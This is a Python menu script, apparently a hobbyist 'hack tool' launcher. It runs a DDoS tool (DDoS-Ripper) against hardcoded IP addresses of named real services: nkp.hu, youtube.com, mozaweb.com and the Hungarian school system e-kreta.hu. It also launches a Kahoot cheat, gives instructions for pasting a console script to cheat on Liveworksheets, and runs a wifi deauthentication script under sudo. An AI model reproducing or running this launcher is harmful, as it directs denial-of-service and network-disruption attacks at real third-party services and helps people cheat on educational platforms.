import time
import os
import pyperclip
from git import Repo


print("####################################")
print("# This program contains many tool  #")
print("# that allows you to hack sql      #")
print("# servers, and use DoS/DDoS, and   #")
print("# kahoot hack tool. Use of this    #")
print("# program is your responsibility.  #")
print("####################################")

time.sleep(1)
print("please type pkg install python3; pip install gitpython; pip install pyperclip to use this tool!")
time.sleep(1)

print("[1]: DoS/DDoS")
print("[2]: kahoot cheat")
print("[3]: liveworksheets cheat")
print("[4]: sql hack")
print("[5]: wifi-deauther")
answer1 = input("Choose from the list (only number): ")

if answer1 == "1":
    print("[1]: install")
    print("[2]: run for nkp.hu")
    print("[3]: run for youtube.com")
    print("[4]: run for mozaweb.com")
    print("[5]: run for e-kreta.hu")
    answer2 = input("Choose from the list (only number): ")

    if answer2 == "1":
        import installdos
        exec(open("installdos.py").read())

    if answer2 == "2":
        os.chdir("DDoS-Ripper")
        os.system('python3 DRipper.py -s 193.224.22.73 -t 135')

    if answer2 == "3":
        os.chdir("DDoS-Ripper")
        os.system('python3 DRipper.py -s 173.194.73.93 -t 135')

    if answer2 == "4":
        os.chdir("DDoS-Ripper")
        os.system('python3 DRipper.py -s 78.24.185.120 -t 135')

    if answer2 == "5":
        os.chdir("DDoS-Ripper")
        os.system('python3 DRipper.py -s 84.206.125.40 -t 135')
    
if answer1 == "2":
    print("[1]: start")
    answer3 = input("Choose from the list (only number): ")

    if answer3 == "1":   
        os.chdir("kahoot-cheats")
        os.system('python3 main.py')
    
if answer1 == "3":
    print("only working in PC (copy the source file called command.js, and paste it to f12/console)")

if answer1 == "4":
    print("soon")

if answer1 == "5":
    print("[1]: start")
    answer4 = input("Choose from the list (only number): ")

    if answer4 == "1":
        print("ONLY WORKING WHEN YOU RUN THE CODE IN NETHUNTER (LINUX CONSOLE)")
        print("[1]: start")
        print("[2]: install packages")
        answer5 = input ("Choose from the list (only number): ")

        if answer5 == "1":
         os.chdir("wifi-deauther")
         os.system('sudo python3 W-Killer.py ')


        if answer5 == "2":
             os.chdir("wifi-deauther")
             os.system('chmod +x INSTALL')
             os.system('sudo ./INSTALL')
